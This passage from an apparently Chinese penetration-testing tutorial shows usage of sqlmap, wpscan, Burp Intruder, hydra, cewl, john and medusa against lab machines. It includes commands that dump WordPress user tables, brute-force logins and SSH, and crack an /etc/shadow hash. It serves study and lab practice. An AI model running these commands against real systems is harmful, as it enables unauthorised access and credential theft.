数据库密码</span><br><span class="hljs-comment">--proxy 代理</span><br><span class="hljs-comment">--time-sec 响应延迟时间</span><br><span class="hljs-comment">--threads 使用多少线程</span><br><span class="hljs-comment">--batch 自动化选择,不会询问你输入，全部默认确定</span><br></code></pre></td></tr></table></figure><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">sqlmap -u url <br>sqlmap -u url <span class="hljs-comment">--dbs 爆出所有数据库</span><br>sqlmap -u url <span class="hljs-comment">--currrent-db 爆出当前数据库</span><br>sqlmap -u url -D <span class="hljs-keyword">security</span> <span class="hljs-comment">--tables 爆出security数据表</span><br>sqlmap -u url -D <span class="hljs-keyword">security</span> -T users <span class="hljs-comment">--columns爆出security数据库中users数据表的列</span><br>sqlmap -u url -D <span class="hljs-keyword">security</span> -T users -C username,<span class="hljs-keyword">password</span> <span class="hljs-comment">--dump 爆出security数据库中users数据表列内容</span><br>sqlmap -r post.txt 读取posts<br></code></pre></td></tr></table></figure><p>eg:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-comment"># 爆数据库名</span><br>sqlmap -u http:<span class="hljs-string">//192.168.200.134/Hackademic_RTB1/</span>?cat=1 <span class="hljs-params">--dbs</span> <span class="hljs-params">--batch</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/11/UVLWMw4CjcXaS8z.png" alt="image-20220108164716371"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 爆指定数据库表名</span><br><span class="hljs-attribute">sqlmap</span> <span class="hljs-number">192.168.56.118</span>/Hackademic_RTB1/?cat=<span class="hljs-number">1</span> -D wordpress --tables --batch<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/11/tpkPDyojQdqzhUi.png" alt="image-20220108164829768"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 爆指定数据表的列名</span><br><span class="hljs-attribute">sqlmap</span> <span class="hljs-number">192.168.56.118</span>/Hackademic_RTB1/?cat=<span class="hljs-number">1</span> -D wordpress -T wp_users --columns --batch<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/11/IevKw6SJXsTg9n3.png" alt="image-20220108165228689"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment"># 爆指定数据表的内容</span><br><span class="hljs-attribute">sqlmap</span> <span class="hljs-number">192.168.56.118</span>/Hackademic_RTB1/?cat=<span class="hljs-number">1</span> -D wordpress -T wp_users -C user_login,user_pass,user_level --dump  --batch<br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/11/E5TPmadfwHybBlF.png" alt="image-20220108165114358"></p><h3 id="2-wpscan"><a href="#2-wpscan" class="headerlink" title="2.wpscan"></a>2.wpscan</h3><p><strong>简介：</strong></p><p>wpscan专门用来扫描wordpress搭建网站的漏洞</p><p><strong>用法：</strong></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs stylus">格式：wpscan <span class="hljs-selector-attr">[options]</span><br><span class="hljs-attr">--api-token</span>  令牌，需在https:<span class="hljs-comment">//wpscan.com/profile获得，没令牌看不到插件漏洞</span><br><span class="hljs-attr">--update</span> 更新数据库<br><span class="hljs-attr">--url</span> &lt;site&gt; 扫描站点<br><span class="hljs-attr">--url</span> &lt;site&gt; <span class="hljs-attr">--enumerate</span> t 对站点主题进行扫描<br><span class="hljs-attr">--url</span> &lt;site&gt; <span class="hljs-attr">--enumerate</span> vt 对站点主题进行漏洞扫描<br><span class="hljs-attr">--url</span> &lt;site&gt; <span class="hljs-attr">--enumerate</span> <span class="hljs-selector-tag">p</span> 对站点插件进行扫描<br><span class="hljs-attr">--url</span> &lt;site&gt; <span class="hljs-attr">--enumerate</span> vp 对站点插件进行漏洞扫描<br><span class="hljs-attr">--url</span> &lt;site&gt; <span class="hljs-attr">--enumerate</span> u 枚举wordpress的用户<br><span class="hljs-attr">--url</span> &lt;site&gt; <span class="hljs-attr">--wordlist</span> 密码字典 <span class="hljs-attr">--username</span> 用户名或者密码字典<br><span class="hljs-attr">--url</span> &lt;site&gt; <span class="hljs-attr">--enmuerate</span> vp,vt,tt,u<br></code></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">wpscan <span class="hljs-params">--url</span> http:<span class="hljs-string">//192.168.56.200/wordpress</span> -e u<br>wpscan <span class="hljs-params">--url</span> http:<span class="hljs-string">//192.168.56.200/wordpress</span> -e vp,vt,tt<br>-e枚举<br>u用户名<br>vp只枚举有漏洞的插件<br>vt只枚举存在漏洞的主题<br>tt列举缩略图相关的文件<br></code></pre></td></tr></table></figure><h3 id="3-burp-suite"><a href="#3-burp-suite" class="headerlink" title="3.burp suite"></a>3.burp suite</h3><p><strong>Intrude模块</strong></p><p>四种模式介绍</p><p><img src="https://img-blog.csdnimg.cn/direct/c01b77137c1c4f378fb4bc699c65ccdc.png" alt="image-20220522182121943"></p><p><strong>Sniper（狙击手模式）</strong></p><p>狙击手模式使用一组payload集合，它一次只使用一个payload标记位置，假设你标记了两个位置user和password，则狙击手会先保持password位置为原有数据，payload逐个替换user；之后保持user位置为原有数据，payload逐个替换user。总攻击次数为(payload数量xpay标记位置数量)。</p><p>payload:</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">admin<br>pikachu<br><span class="hljs-keyword">test</span><br><span class="hljs-keyword"></span>tian<br></code></pre></td></tr></table></figure><p>攻击结果：</p><p><img src="https://img-blog.csdnimg.cn/direct/6ccda977d5bb43ba97b85ebe36c4fd82.png" alt="image-20220522182600994"></p><p><img src="https://img-blog.csdnimg.cn/direct/14ad4cc7222d468bb66a85529f5bb836.png" alt="image-20220522182620759"></p><p><img src="https://img-blog.csdnimg.cn/direct/c8b73f0e6dd44782a1ebe65c21ac0feb.png" alt="image-20220522182636912"></p><p><strong>Battering ram（攻城锤模式）</strong></p><p>攻城锤模式与狙击手模式类似的地方是，同样只使用一个payload集合，不同的地方在于每次攻击都是替换所有payload标记位置，而狙击手模式每次只能替换一个payload标记位置。总攻击次数为(payload数量)。</p><p>payload:</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">admin<br>pikachu<br><span class="hljs-keyword">test</span><br><span class="hljs-keyword"></span>tian<br></code></pre></td></tr></table></figure><p>攻击结果：</p><p><img src="https://img-blog.csdnimg.cn/direct/db78de7b66554883866b4eaf6111dc28.png" alt="image-20220522182837558"></p><p><img src="https://img-blog.csdnimg.cn/direct/299b4ce570c549b3b4ea8a484474bb96.png" alt="image-20220522182852593"></p><p><strong>Pitchfork（草叉模式）</strong></p><p>草叉模式允许使用多组payload组合，在每个标记位置上遍历所有payload组合。总攻击次数为(payload数量)。</p><p>payload1：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">admin<br>pikachu<br><span class="hljs-keyword">test</span><br><span class="hljs-keyword"></span>tian<br></code></pre></td></tr></table></figure><p>payload2:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">123456<br>000000<br>abc123<br>tian<br></code></pre></td></tr></table></figure><p>攻击结果：</p><p><img src="https://img-blog.csdnimg.cn/direct/e72d9be9fa5446869b851456f5883a08.png" alt="image-20220522183017937"></p><p><strong>Cluster bomb（集束炸弹模式）</strong></p><p>集束炸弹模式跟草叉模式不同的地方在于，集束炸弹模式会对payload组进行笛卡尔积。总攻击次数为(payload1数量xpayload2数量)。</p><p>payload1：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">admin<br>pikachu<br><span class="hljs-keyword">test</span><br><span class="hljs-keyword"></span>tian<br></code></pre></td></tr></table></figure><p>payload2:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">123456<br>000000<br>abc123<br>tian<br></code></pre></td></tr></table></figure><p>攻击结果:</p><p><img src="https://img-blog.csdnimg.cn/direct/8f9ef3fa904e4ecdbc3f65faba1a9205.png" alt="image-20220522183053265"></p><h2 id="四、提权"><a href="#四、提权" class="headerlink" title="四、提权"></a>四、提权</h2><h2 id="五、密码攻击"><a href="#五、密码攻击" class="headerlink" title="五、密码攻击"></a>五、密码攻击</h2><h3 id="1、hydra"><a href="#1、hydra" class="headerlink" title="1、hydra"></a>1、hydra</h3><p><strong>用法：</strong></p><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs inform7">格式：hydra <span class="hljs-comment">[<span class="hljs-comment">[<span class="hljs-comment">[-l LOGIN|-L FILE]</span> <span class="hljs-comment">[-p PASS|-P FILE]</span>]</span> | <span class="hljs-comment">[-C FILE]</span>]</span> <span class="hljs-comment">[-e ns]</span><br><span class="hljs-comment">[-o FILE]</span> <span class="hljs-comment">[-t TASKS]</span> <span class="hljs-comment">[-M FILE <span class="hljs-comment">[-T TASKS]</span>]</span> <span class="hljs-comment">[-w TIME]</span> <span class="hljs-comment">[-f]</span> <span class="hljs-comment">[-s PORT]</span> <span class="hljs-comment">[-S]</span> <span class="hljs-comment">[-vV]</span><br>server service <span class="hljs-comment">[OPT]</span><br>-R 继续从上一次进度接着破解<br>-S 大写，采用SSL链接<br>-s &lt;PORT&gt; 小写，可通过这个参数指定非默认端口<br>-l &lt;LOGIN&gt;<br>指定破解的用户，对特定用户破解<br>-L &lt;FILE&gt; 指定用户名字典<br>-p &lt;PASS&gt; 小写，指定密码破解，少用，一般是采用密码字典<br>-P &lt;FILE&gt; 大写，指定密码字典<br>-e &lt;ns&gt; 可选选项，n：空密码试探，s：使用指定用户和密码试探<br>-C &lt;FILE&gt; 使用冒号分割格式，例如“登录名:密码”来代替-L/-P参数<br>-M &lt;FILE&gt; 指定目标列表文件一行一条<br>-o &lt;FILE&gt; 指定结果输出文件<br>-f 在使用-M参数以后，找到第一对登录名或者密码的时候中止破解<br>-t &lt;TASKS&gt; 同时运行的线程数，默认为16<br>-w &lt;TIME&gt; 设置最大超时的时间，单位秒，默认是30s<br>-v / -V 显示详细过程<br><br>server<br>目标ip<br><br>service<br>指定服务名，支持的服务和协议：telnet ftp pop3<span class="hljs-comment">[-ntlm]</span> imap<span class="hljs-comment">[-ntlm]</span> smb smbnt http<span class="hljs-comment">[s]</span>-&#123;head|get&#125; http-&#123;get|post&#125;-form http-proxy cisco cisco-enable vnc ldap2 ldap3 mssql mysql oracle-listener postgres nntp socks5 rexec rlogin pcnfs snmp rsh cvs svn icq sapr3 ssh2 smtp-auth<span class="hljs-comment">[-ntlm]</span> pcanywhere teamspeak sip vmauthd firebird ncp afp等等<br><br>OPT<br>可选项<br></code></pre></td></tr></table></figure><p><strong>示例</strong></p><p>密码破解</p><figure class="highlight tcl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs tcl">hydra -L <span class="hljs-keyword">dict</span>.txt -P <span class="hljs-keyword">dict</span>.txt <span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.119</span> <span class="hljs-keyword">http</span>-get /webdav<br><span class="hljs-comment"># http-get为协议</span><br><span class="hljs-comment"># /webdav为目录</span><br></code></pre></td></tr></table></figure><p>破解成功<img src="https://s2.loli.net/2022/01/11/VvWhR3g6ptaZozn.png" alt="image-20220110225241143"></p><figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs parser3"><span class="language-xml">hydra -L dict.txt -P dict.txt -vV -f </span><span class="hljs-number">192.168</span><span class="hljs-number">.56</span><span class="hljs-number">.120</span><span class="language-xml"> http-post-form &quot;/wordpress/wp-login.php:user_login=</span><span class="hljs-keyword">^USER</span><span class="language-xml">^&amp;user_pass=</span><span class="hljs-keyword">^PASS</span><span class="hljs-keyword">^:login_error</span><span class="language-xml">&quot;</span><br><span class="language-xml"></span><br><span class="language-xml">-f 找到一个结果后停止</span><br><span class="language-xml">-vV显示详细过程</span><br><span class="language-xml">&quot;/wordpress/wp-login.php:user_login=</span><span class="hljs-keyword">^USER</span><span class="language-xml">^&amp;user_pass=</span><span class="hljs-keyword">^PASS</span><span class="hljs-keyword">^:login_error</span><span class="language-xml">&quot;是由冒号分隔三个部分，第一个部分是登录页面所在目录，第二部分user_login=</span><span class="hljs-keyword">^USER</span><span class="language-xml">^&amp;user_pass=</span><span class="hljs-keyword">^PASS</span><span class="language-xml">^，这是POST提交表单中id的名字，把用户名和密码部分换成了</span><span class="hljs-keyword">^USER</span><span class="language-xml">^和</span><span class="hljs-keyword">^PASS</span><span class="language-xml">^。USER对应前面的-L，PASS对应-P。最后一部分login_error是指定的判断密码是否正确的条件，默认是黑名单模式，也就是如果返回页面中存在&quot;login_error&quot;(提交错误后查看错误信息对应源码)就说明这个密码不正确。user_login、user_pass、login_error这三个内容要根据页面中源码里的id的值进行修改。</span><br></code></pre></td></tr></table></figure><h3 id="2、cewl"><a href="#2、cewl" class="headerlink" title="2、cewl"></a>2、cewl</h3><p><a href="https://www.codercto.com/a/44828.html">参考链接</a></p><p><strong>介绍：</strong></p><p>cewl是一个 <a href="http://www.codercto.com/category/ruby.html">ruby</a> 应用，爬行指定url的指定深度。也可以跟一个外部链接，结果会返回一个单词列表，这个列表可以扔到John the ripper工具里进行密码破解。cewl还有一个相关的命令行 <a href="http://www.codercto.com/tool.html">工具</a> 应用FAB，它使用相同的元数据提取技术从已下载的列表中创建作者&#x2F;创建者列表。</p><p><strong>用法：</strong></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs css">格式：cewl &lt;url&gt; <span class="hljs-selector-attr">[options]</span><br><br>-h,<span class="hljs-attr">--help</span> 显示帮助<br>-k,<span class="hljs-attr">--keep</span> 保存下载文件<br>-d &lt;<span class="hljs-attribute">x</span>&gt;,<span class="hljs-attr">--depth</span> &lt;<span class="hljs-attribute">x</span>&gt; 爬行深度，默认为<span class="hljs-number">2</span><br>-m,<span class="hljs-attr">--min_world_length</span> 最小长度，默认为<span class="hljs-number">3</span><br>-o,<span class="hljs-attr">--offsize</span> 允许<span class="hljs-number">1</span>爬虫访问其他站点<br>-w,<span class="hljs-attr">--write</span> 将结果输出写入文件<br>-u,<span class="hljs-attr">--ua</span> &lt;agent&gt; 设置UA<br>-n,<span class="hljs-attr">--no-words</span> 不输出字典<br><span class="hljs-attr">--with-numbers</span> 允许单词中存在数字<br>-<span class="hljs-selector-tag">a</span>,<span class="hljs-attr">--meta</span> 包括元数据<br><span class="hljs-attr">--meta_file</span> file 输出元数据文件<br>-e,<span class="hljs-attr">--email</span> 包括email地址<br><span class="hljs-attr">--meta-temp-dir</span> &lt;dir&gt; exiftool解析文件时使用的临时目录，默认是/temp。<br>-c, <span class="hljs-attr">--count</span> 显示发现的每个单词的数量。<br>-v, <span class="hljs-attr">--verbose</span> verbose。<br><span class="hljs-attr">--debug</span> 提取调试信息。<br><br>认证<br><span class="hljs-attr">--auth_type</span> Digest或者basic认证。<br><br><span class="hljs-attr">--auth_user</span> 用户名认证。<br><br><span class="hljs-attr">--auth_pass</span> 密码认证。<br>代理<br><br><span class="hljs-attr">--proxy_host</span> 代理主机。<br><br><span class="hljs-attr">--proxy_port</span> 代理端口，默认<span class="hljs-number">8080</span>。<br><br><span class="hljs-attr">--proxy_username</span> 用户名代理。<br><br><span class="hljs-attr">--proxy_password</span> 密码代理。<br></code></pre></td></tr></table></figure><p><strong>示例</strong></p><p><strong>默认用法</strong></p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"><span class="hljs-comment"># 爬行指定url,输出单词列表</span><br>cewl <span class="hljs-variable">&lt;url&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/01/11/nkwNKt9XeM3RFyx.png" alt="image-20220110224446486"></p><p><strong>cewl认证登录</strong></p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs brainfuck"><span class="hljs-comment">cewl</span> &lt;<span class="hljs-comment">url</span>&gt; <span class="hljs-literal">--</span><span class="hljs-comment">auth_type Digest</span> <span class="hljs-literal">--</span><span class="hljs-comment">auth_user admin</span> <span class="hljs-literal">--</span><span class="hljs-comment">auth_pass password</span> <span class="hljs-literal">-</span><span class="hljs-comment">v</span><br><span class="hljs-comment">或</span><br><span class="hljs-comment">cewl</span> &lt;<span class="hljs-comment">url</span>&gt; <span class="hljs-literal">--</span><span class="hljs-comment">auth_type basic</span> <span class="hljs-literal">--</span><span class="hljs-comment">auth_user admin</span> <span class="hljs-literal">--</span><span class="hljs-comment">auth_pass password</span> <span class="hljs-literal">-</span><span class="hljs-comment">v</span><br></code></pre></td></tr></table></figure><p><strong>使用代理</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">cewl --proxy_host &lt;--proxy_port <span class="hljs-tag">&lt;<span class="hljs-name">port</span>&gt;</span> <span class="hljs-tag">&lt;<span class="hljs-name">url</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3、john"><a href="#3、john" class="headerlink" title="3、john"></a>3、john</h3><p><strong>功能：</strong></p><p>John the Ripper是一个快速的密码破解程序，目前可用于Unix，Windows，DOS和OpenVMS的许多口味。其主要目的是检测弱Unix密码。除了在各种Unix系统上最常见的几种crypt（3）密码哈希类型之外，现在支持的还有Windows LM哈希，以及社区增强版本中的大量其他哈希和密码。</p><p><strong>用法：</strong></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">格式：john &lt;OPTIONS&gt; &lt;PASSWORD-FILES&gt;<br><br><span class="hljs-params">--single</span>[=SECTION] ]“单裂”模式<br><span class="hljs-params">--wordlist</span>[=FILE] <span class="hljs-params">--stdin</span>  单词表模式，从FILE或stdin读取单词<br><span class="hljs-params">--pipe</span> 像<span class="hljs-params">--stdin</span>一样，但批量读取，并允许规则<br><span class="hljs-params">--loopback</span>[=FILE] 像 <span class="hljs-params">--wordlistg</span>一样, 但是从<span class="hljs-string">.pot</span>文件中获取单词<br><span class="hljs-params">--dupe-suppression</span> 压制wordlist中的所有模糊（并强制预加载）<br><span class="hljs-params">--prince</span>[=FILE] PRINCE模式，从FILE中读取单词<br><span class="hljs-params">--encoding=NAME</span> 输入编码（例如，UTF-8，ISO-8859-1）。 也可以看看doc / ENCODING和<span class="hljs-params">--list</span> = hidden-options。<br><span class="hljs-params">--rules</span>[=SECTION] 为单词表模式启用单词修改规则<br><span class="hljs-params">--incremental</span>[=MODE] “增量”模式[使用部分模式]<br><span class="hljs-params">--mask=MASK</span> 掩码模式使用MASK<br><span class="hljs-params">--markov</span>[=OPTIONS] “马尔可夫”模式（参见doc / MARKOV）<br><span class="hljs-params">--external=MODE</span> 外部模式或字过滤器<br><span class="hljs-params">--stdout</span>[=LENGTH] 只是输出候选人密码[在LENGTH切]<br><span class="hljs-params">--restore</span>[=NAME] 恢复被中断的会话[名为NAME]<br><span class="hljs-params">--session=NAME</span> 给一个新的会话NAME<br><span class="hljs-params">--status</span>[=NAME] 打印会话的状态[名称]<br><span class="hljs-params">--make-charset=FILE</span> 制作一个字符集文件。 它将被覆盖<br><span class="hljs-params">--show</span>[=LEFT] 显示破解的密码[如果=左，然后uncracked]<br><span class="hljs-params">--test</span>[=TIME] 运行测试和每个TIME秒的基准<br><span class="hljs-params">--users=</span>[-]LOGIN|UID[,<span class="hljs-string">..</span>] [不]只加载这个（这些）用户<br><span class="hljs-params">--groups=</span>[-]GID[,<span class="hljs-string">..</span>] 只加载这个（这些）组的用户<br><span class="hljs-params">--shells=</span>[-]SHELL[,<span class="hljs-string">..</span>] 用[out]这个（这些）shell来加载用户<br><span class="hljs-params">--salts=</span>[-]COUNT[<span class="hljs-function">:MAX</span>] 用[out] COUNT [到MAX]散列加载盐<br><span class="hljs-params">--save-memory=LEVEL</span> 启用内存保存，级别1.<span class="hljs-string">.3</span><br><span class="hljs-params">--node=MIN</span>[-MAX]<span class="hljs-string">/TOTAL</span> 此节点的数量范围不在总计数中<br><span class="hljs-params">--fork=N</span> 叉N过程<br><span class="hljs-params">--pot=NAME</span> 锅文件使用<br><span class="hljs-params">--list=WHAT</span> 列表功能，请参阅<span class="hljs-params">--list</span> = <span class="hljs-keyword">help</span>或doc / OPTIONS<br><span class="hljs-params">--format=NAME</span> 强制使用NAME类型的散列。 支持的格式可以用<span class="hljs-params">--list=formats</span>和<span class="hljs-params">--list=subformats</span>来看<br><br><span class="hljs-comment"># 我们使用john自带的密码字典，位置为/usr/share/john/password.lst</span><br>john <span class="hljs-params">--wordlist=/usr/share/john/password</span>.lst<br><span class="hljs-comment"># john工具对于同一个hash文件只会进行一次爆破，如果第二次执行john hash是错的</span><br>john <span class="hljs-params">--show</span> &lt;hash文件名&gt;<br></code></pre></td></tr></table></figure><p><strong>示例：</strong></p><p>暴力破解登陆密码：</p><p>查看&#x2F;ect&#x2F;shadow文件，发现hacksudo密码密文</p><p><img src="https://img-blog.csdnimg.cn/direct/a949520f07ad48a18e958d1ca315b65f.png" alt="image-20220203180352466"></p><p>创建一个文件hash.txt，放密文拷贝到hash.txt中</p><p><img src="https://img-blog.csdnimg.cn/direct/42bc5107fb3846b2b8b573ad8856f5d5.png" alt="image-20220203180838402"></p><p>使用命令john hash.txt破解密码</p><p><img src="https://img-blog.csdnimg.cn/direct/c6a54542a14b486fa5be59dff2ff00f5.png" alt="image-20220203180921499"></p><p>使用命令john -show hash.txt查看破解到的密码，发现用户hacksudo的密码为aliens</p><p><img src="https://img-blog.csdnimg.cn/direct/95311c715db449c6bad42b6c5200108a.png" alt="image-20220203180952064"></p><h3 id="4、medusa"><a href="#4、medusa" class="headerlink" title="4、medusa"></a>4、medusa</h3><p><strong>功能：</strong></p><p>medusa是一款开源的暴力破解工具，支持多种协议的密码破解。</p><p><strong>用法：</strong></p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs diff">格式：<br>medusa [-h host|-H file] [-u username|-U file] [-p password|-P file] [-C file] -M module [OPTIONS]<br><br><span class="hljs-deletion">-h 目标地址</span><br><span class="hljs-deletion">-H 包含目标地址的文件</span><br><span class="hljs-deletion">-u 包含测试的用户名</span><br><span class="hljs-deletion">-U 指定测试的用户名字典</span><br><span class="hljs-deletion">-p 指定测试密码</span><br><span class="hljs-deletion">-P 指定测试的密码字典</span><br><span class="hljs-deletion">-C 指定测试格式为&quot;user:password&quot;的测试字典</span><br><span class="hljs-deletion">-O 将输出结果保存至指定文件</span><br><span class="hljs-deletion">-e [n/s/ns] 额外的密码检测(n:空密码;s:用户名=密码)</span><br><span class="hljs-deletion">-M 指定执行的模块名(不带mod扩展名)</span><br><span class="hljs-deletion">-m 指定传递给模块的参数</span><br><span class="hljs-deletion">-d 查看支持破解的模块</span><br><span class="hljs-deletion">-n 指定非默认的端口</span><br><span class="hljs-deletion">-s 启用ssl</span><br><span class="hljs-deletion">-g 设置连接超时时间(默认值为3)</span><br><span class="hljs-deletion">-r 设置重试次数(默认值为3)</span><br><span class="hljs-deletion">-t 设置同时测试的登陆总数</span><br><span class="hljs-deletion">-T 设置同时测试的主机总数</span><br><span class="hljs-deletion">-f 在破解得到第一个用户名或密码后停止扫描主机 </span><br><span class="hljs-deletion">-F 当在任何主机上破解得到第一个用户名或密码后停止扫描</span><br><span class="hljs-deletion">-b 不显示软件启动时的版本信息</span><br><span class="hljs-deletion">-q 显示模块的使用信息</span><br><span class="hljs-deletion">-v 详细等级(0-6)</span><br><span class="hljs-deletion">-w 错误调试等级(0-10)</span><br><span class="hljs-deletion">-V 显示版本信息</span><br><span class="hljs-deletion">-Z 恢复中止的扫描</span><br></code></pre></td></tr></table></figure><p><strong>示例：</strong></p><p>已知用户民，破解ssh密码</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">medusa</span> -u missyred -P /usr/share/wordlists/rockyou.txt -h <span class="hljs-number">10.35.153.37</span> -M ssh -f -t <span class="hljs-number">5</span> <br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/direct/e5618ae82d744051b9641d82cb748bac.png" alt="image-20220920231455392"></p><h2 id="六、无线攻击"><a href="#六、无线攻击" class="headerlink" title="六、无线攻击"></a>六、无线攻击</h2><h3 id="1-Aircrack-ng无线套装"><a href="#1-Aircrack-ng无线套装" class="headerlink" title="1.Aircrack-ng无线套装"></a>1.Aircrack-ng无线套装</h3><p>Aircrack-ng（注意大小写，aircrack-ng是Aircrack-ng中的一个组件）是一个包含了多款工具的无线攻击审计套装，这里面很多工具在后面的内容中都会用到，具体见下表为Aircrack-ng包含的组件具体列表。</p><p><a href="https://www.jianshu.com/p/9ee0a590dee7">aircrack-ng原理解析</a></p><table><thead><tr><th align="left">组件名</th><th>描述</th></tr></thead><tbody><tr><td 